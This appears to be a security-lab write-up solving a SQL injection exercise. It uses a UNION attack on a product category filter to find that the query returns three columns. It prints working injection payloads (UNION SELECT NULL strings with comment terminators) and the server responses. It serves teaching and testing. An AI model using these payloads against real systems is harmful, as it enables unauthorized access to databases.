## SQL injection UNION attack, determining the number of columns returned by the query

This lab contains a SQL injection vulnerability in the product category filter. Using a UNION attack, the goal is to determine how many columns are returned by the SQL query.

## Notes

- `/login`
- `/filter?category=parameter`

## Resume

1. Capture the `filter` request
2. Test the number of columns with `UNION SELECT`
3. Increase the number of `NULL` values until the query works

## Solve

The easiest way to determine the number of columns is to use a UNION SELECT statement with `NULL` values.

Start with a single column :

```
' UNION ALL SELECT NULL-- -
```

This returns :

```
Internal Server Error
```

Increase the number of columns :

```
' UNION ALL SELECT NULL,NULL,NULL-- -
```

This time the request succeeds and the lab is solved.

This confirms that the original query contains **3 columns**.